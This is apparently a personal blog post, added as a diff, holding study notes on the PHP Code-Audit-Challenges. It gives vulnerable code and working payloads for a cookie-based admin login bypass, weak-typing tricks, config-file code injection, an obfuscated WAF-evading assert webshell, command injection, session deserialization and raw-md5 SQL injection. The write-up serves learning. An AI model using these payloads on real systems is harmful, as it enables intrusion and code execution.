@@ -1,0 +1,383 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>Code-Audit-Challenges#php 刷题记录【历史笔记】 | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">Code-Audit-Challenges#php 刷题记录【历史笔记】</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2020-09-03</span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <blockquote>
+<p>堆点安全的博文，一直以来是笔记党。把去年8月的刷题笔记发上来。正在做的攻防世界没做啥刷题笔记，就用这篇代替啦（bu<br>
+今年光顾着写代码了，安全啥的给落下了还是要继续努力&gt;-&lt;  （而且发现好久不巩固是会忘记的，又要再次巩固学习一次了）</p>
+</blockquote>
+<p>题目列表</p>
+<ul>
+<li>https://github.com/CHYbeta/Code-Audit-Challenges<br>
+https://blog.szfszf.top/tech/code-audit-challenge-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</li>
+</ul>
+<!-- more -->
+<h2 id="challenge1-phpbug-69892">Challenge1 phpBug #69892</h2>
+<p>解法1：<br>
+把提供的users数组内的值全都md5破解，匹配有哪一条能够破解。<br>
+其中<br>
+<code>5:06e2b745f3124f7d670f78eabaa94809&quot;</code><br>
+破解为<br>
+<img src="https://1dayluo.github.io/post-images/1599127439523.png" alt="" loading="lazy"><br>
+根据代码</p>
+<pre><code class="language-php">$input = $_COOKIE['user'];
+$input[1] = md5($input[1]);
+foreach ($users as $user){        
+$user = explode(&quot;:&quot;, $user);        
+if ($input === $user) {                
+$uid = $input[0] + 0;                
+$valid_user = true;        
+}}
+</code></pre>
+<p>user[1]为密码<br>
+user[0]为uid<br>
+<img src="https://1dayluo.github.io/post-images/1599127536773.png" alt="" loading="lazy"><br>
+如图即可成功登录为授权用户。<br>
+解法2：（出题人希望）<br>
+在5.4以下的版本会有</p>
+<p>在代码的实现中，比较后赋值的变量是int型32位，但是等号右边是两个64位相减。等号右边低32位相减为0则会误判为相等。<br>
+（貌似大意是这个）<br>
+The problem in the code above is that numerical indices got compared by subtracting their values from each other, which are stored in the h element of the bucket data type. A difference is then detected if the result is 0 or not. Unfortunately the h element of the structure bucket is defined as unsigned long, which is usually 64bit on 64bit systems, but the result variable is only a 32bit int data type. Therefore the comparison is not only true if the values of h are identical but every time the result of the subtraction has all zero lower 32 bits. Therefore the key 0 and the key 4294967296 and many other keys are considered identical.</p>
+<p>具体讲解看源代码和官方题解。<br>
+所以会产生一个安全bug，例如以下例子<br>
+<code>var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]); // bool(true)</code><br>
+user[4294967296]=5即[0x100000000 =&gt; 5] == [0 =&gt;5]</p>
+<p>比较的时候</p>
+<pre><code class="language-php">if ($input === $user) {
+           $uid = $input[0] + 0;                
+           $valid_user = true;       
+ }
+</code></pre>
+<p>这里用户名用这里会比较通过（以用户5的身份进行比较）。<br>
+但是在下一行代码，取<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>n</mi><mi>p</mi><mi>u</mi><mi>t</mi><mo>[</mo><mn>0</mn><mo>]</mo><mi mathvariant="normal">的</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">候</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">发</mi><mi mathvariant="normal">现</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mo>[</mo><mn>0</mn><mo>]</mo><mi mathvariant="normal">不</mi><mi mathvariant="normal">存</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">于</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">input[0]的时候，会发现user[0]不存在。于是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">p</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">候</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">发</span><span class="mord cjk_fallback">现</span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">是</span></span></span></span>uid便为：<br>
+<code>$uid=NULL+0;//uid=0;</code><br>
+最终将以用户0的身份登录，也就是admin用户。<br>
+最终payload为<br>
+<code>Cookie: user[4294967296]=5;user[1]=hund;</code></p>
+<h2 id="challenge2-php弱类型is_numeric">Challenge2 php弱类型,is_numeric()</h2>
+<p>源代码：</p>
+<pre><code class="language-php">&lt;?php
+show_source(__FILE__);
+$flag = &quot;xxxx&quot;;
+if(isset($_GET['time'])){  
+        if(!is_numeric($_GET['time'])){  
+                echo 'The time must be number.';  
+        }else if($_GET['time'] &lt; 60 * 60 * 24 * 30 * 2){  
+                        echo 'This time is too short.';  
+        }else if($_GET['time'] &gt; 60 * 60 * 24 * 30 * 3){  
+                        echo 'This time is too long.';  
+        }else{  
+                sleep((int)$_GET['time']);  
+                echo $flag;  
+        }  
+                echo '&lt;hr&gt;';  
+}
+?&gt;
+</code></pre>
+<p>payload</p>
+<p><code>time=5.184001e6 //或0x4F1A01</code></p>
+<p>判断时time等于5184000，科学计数法传参到sleep失效。</p>
+<h2 id="challenge3-php配置文件写入问题">Challenge3 php配置文件写入问题</h2>
+<p>源代码：<br>
+<img src="https://1dayluo.github.io/post-images/1599127684662.png" alt="" loading="lazy"></p>
+<p>payload</p>
+<p><code>option=222%27;%0aphpinfo();\\</code></p>
+<p>xxxxx/option.php内容会变为：<br>
+<img src="https://1dayluo.github.io/post-images/1599127711676.png" alt="" loading="lazy"></p>
+<h2 id="challenge5-webshell-waf绕过">Challenge5 webshell、waf绕过</h2>
+<p>利用的是当字符串与数组拼接后为一个字符串，值为Array。测试如下（php5下5.4及以上的能用。5.2,5.3，php7都没这个特性）<br>
+<img src="https://1dayluo.github.io/post-images/1599127747253.png" alt="" loading="lazy"><br>
+payload（ https://chybeta.github.io/2017/07/15/%E4%B8%80%E9%81%93%E5%A5%BD%E7%8E%A9%E7%9A%84webshell%E9%A2%98/ ）<br>
+*刚开始学习阶段，打算先从学习别人如何写开始</p>
+<pre><code class="language-php">&lt;?php
+$_='';$_[+$_]++;
+$_=$_.'';    //获取字符串：“Array”。
+$__=$_[+'']; //获取大写字母A $__为&quot;A&quot;
+$_ = $__; //$_为A 
+$___=$_; //$__为A
+$__=$_; //$__为A 
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__此时为S
+$___.=$__;//$___为AS
+$___.=$__; //$__为ASS
+$__=$_;//$__为A
+$__++;$__++;$__++;$__++;//$__为E
+$___.=$__;
+$__=$_; //$__初始化为A
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__此时为R
+$___.=$__; //$___此时为ASSER
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//$__此时为T
+$___.=$__; //$___此时为ASSERT
+$____='_';//$___此时值为_
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$_此时为P
+$____.=$__; //_P ？？？
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$____.=$__; //_PO
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$____.=$__; //_POS
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$____.=$__;//_POST
+$_=$$____;//$_的值为$POST;
+$___($_[_]);  //最终$___为ASSERT，$_为$_POST组合起来就是ASSERT($_POST[_])
+//最后burpsuite抓包赋值给_
+</code></pre>
+<p>最终payload</p>
+<pre><code class="language-php">http://192.168.1.134/Challenge5.php?c=$_=%27%27;$_[%2b$_]%2b%2b;$_=$_.%27%27;$__=$_[%2b%27%27];$_=$__;$___=$_;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$____=%27_%27;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$__=$_;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$____.=$__;$_=$$____;$___($_[_]);
+</code></pre>
+<p>web页面:<br>
+<img src="https://1dayluo.github.io/post-images/1599127806565.png" alt="" loading="lazy"><br>
+我在webshell的url下传参给_，没有生效。不知道为什么.<br>
+<img src="https://1dayluo.github.io/post-images/1599127826511.png" alt="" loading="lazy"></p>
+<h2 id="challenge6-命令执行waf绕过">Challenge6 #命令执行，waf绕过</h2>
+<p>（Linux环境运行php）payload:</p>
+<p><code>http://192.168.1.134/Challenge6.php?ip=127.0.0.1%0als</code></p>
+<h2 id="challenge7-php弱类型">Challenge7 php弱类型</h2>
+<p>php中==会把0e开头的字符串当作科学计数法的形式用（admin674227342的md5值也是0e开头）。只需输入一个32位0e开头的值即可<br>
+这道题的题解并没在本地环境中生效。php版本从5.2/5.3/5.4/5.5/5.6到php7都没有触发，很想知道是为什么</p>
+<h2 id="challenge8-sql注入tricks">Challenge8 SQL注入#tricks</h2>
+<p>关键在下句</p>
+<p><code>mysqli_query($mysqli,&quot;desc </code>secret_{$table}<code>&quot;) or Hacker();</code><br>
+desc没有用反引号与内置关键字区分开<br>
+<img src="https://1dayluo.github.io/post-images/1599127903177.png" alt="" loading="lazy"></p>
+<h2 id="challenge9">Challenge9</h2>
+<pre><code class="language-php">&lt;?php
+//A webshell is wait for you
+ini_set('session.serialize_handler', 'php');
+session_start();
+class OowoO
+{
+   public $mdzz;
+   function __construct()
+   {
+           $this-&gt;mdzz = 'phpinfo();';
+   }
+   function __destruct()
+   {
+           eval($this-&gt;mdzz);
+   }
+}
+if(isset($_GET['phpinfo']))
+{
+   $m = new OowoO();
+}
+else
+{
+   highlight_string(file_get_contents('index.php'));
+}
+?&gt;
+</code></pre>
+<p>可以推测出，关键在于利用eval($this-&gt;mdzz);这个函数。但是接下来就迷茫了。<br>
+查了一下网上的:</p>
+<p>从魔法函数可以看出这是一个反序列化漏洞，</p>
+<p>感觉自己该补充一下反序列化漏洞的知识了，学习了https://godlin.top/2018/11/08/web-2/ 和 https://zhuanlan.zhihu.com/p/60397730 以后知道能够利用的代码在：<br>
+<code>ini_set('session.serialize_handler', 'php');</code><br>
+在ini配置文件中，'serialize_handler' =&gt; 'php_serialize'<br>
+在设置和读取session两个阶段中，如果使用了不同序列化方法将产生任意对象注入从而导致反序列化漏洞。这道题按照网上payload没有复现成功。于是我又阅读了一篇关于序列化的文章： https://www.anquanke.com/post/id/159206<br>
+用到的知识点有以下<br>
+1.序列化漏洞常见的魔法函数（水题多出现）<br>
+2.session反序列化漏洞<br>
+即存储时使用php_serialize（输入了含|的内容，其中|后包括要执行的php代码），序列化的内容会存储到/tmp文件夹下<br>
+读取时使用php，将|后的内容当作value。从而将该内容赋值给变量<br>
+3.session.upload_progress.enabled为On时，php处理机制（如下）<br>
+session.upload_progress.enabled为On。session.upload_progress.enabled本身作用不大，是用来检测一个文件上传的进度。但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时（session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。<br>
+<img src="https://1dayluo.github.io/post-images/1599127960012.png" alt="" loading="lazy"><br>
++*php大于5.5.4的版本中默认使用php_serialize规则</p>
+<p>故可知应如下构造payload：<br>
+构造一个上传表单的poc。表单中PHP_SESSION_UPLOAD_PROGRESS中的value设为php_serialize序列化的字符串：</p>
+<p><code>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:26:&quot;print_r(scandir(__dir__));&quot;;}</code></p>
+<p>最终如下</p>
+<pre><code class="language-html">&lt;form action=&quot;http://192.168.1.134/Challenge9.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:26:&quot;print_r(scandir(__dir__));&quot;;}&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt; &lt;/form&gt;
+</code></pre>
+<p>原题是通过序列化漏洞读取文件目录，然后再利用该poc读取flag文件内容。</p>
+<p>右边是我注入的，左边是网友成功的。但是谜之一到我的环境就失败<br>
+<img src="https://1dayluo.github.io/post-images/1599128004791.png" alt="" loading="lazy"></p>
+<h2 id="challenge10-php弱类型绕过">Challenge10 #php弱类型绕过</h2>
+<p>题目在线网址 http://web.jarvisoj.com:32780/index.php?id=1</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+echo &quot;&lt;!--index.phps--&gt;&quot;;
+if(!$_GET['id'])
+{
+        header('Location: index.php?id=1');
+        exit();
+}
+$id=$_GET['id'];
+$a=$_GET['a'];
+$b=$_GET['b'];
+if(stripos($a,'.'))//如果a变量有.出现
+{
+        echo 'Hahahahahaha';
+        return ;
+}
+$data = @file_get_contents($a,'r'); //读取a变量所代表的文件
+if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
+{
+        require(&quot;flag.txt&quot;);
+}
+else
+{
+        print &quot;work harder!harder!harder!&quot;;
+}
+?&gt;
+</code></pre>
+<p>要绕过的代码</p>
+<pre><code class="language-php">if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
+</code></pre>
+<p>要学习的文章：<br>
+php弱类型：<br>
+https://www.secpulse.com/archives/69529.html（已完成）<br>
+php://input<br>
+https://www.waitalone.cn/php-file-include.html</p>
+<p>学习后发现就是利用php://input把文件包含漏洞变为命令执行漏洞。<br>
+b则为%00截断。<br>
+但是00截断触发是有条件的： https://skysec.top/2017/09/06/%E8%BF%87%E6%B0%94%E7%9A%8400%E6%88%AA%E6%96%AD/<br>
+php版本小于5.3.4才可以</p>
+<figure data-type="image" tabindex="1"><img src="https://1dayluo.github.io/post-images/1599128065576.png" alt="" loading="lazy"></figure>
+<h2 id="challenge11">Challenge11</h2>
+<p>要注入下列sql语句：<br>
+<code>&quot;select * from </code>admin<code> where password='&quot;.md5($pass,true).&quot;'&quot;</code></p>
+<p>关键在md5(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>a</mi><mi>s</mi><mi>s</mi><mo separator="true">,</mo><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi><mo>)</mo><mi mathvariant="normal">，</mi><mi mathvariant="normal">若</mi></mrow><annotation encoding="application/x-tex">pass,true)，若</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">u</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">若</span></span></span></span>pass的值为ffifdyop，则经过md5转换后的值再经过php转为字符串后会变成'or'6蒥欓!r,b，6的后面是一堆乱七八糟的字符，姑且记为xx吧。则最后的sql查询语句为：</p>
+<p><code>select * from </code>admin<code> where password=''or'6蒥欓!r,b'</code></p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/yi-pian-zhen-dui-gong-zuo-hou-de-fan-si-huo-xu-de-sui-sui-nian/">
+              <h3 class="post-title">
+                下一篇：一篇针对工作后的反思（或许)的碎碎念 
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
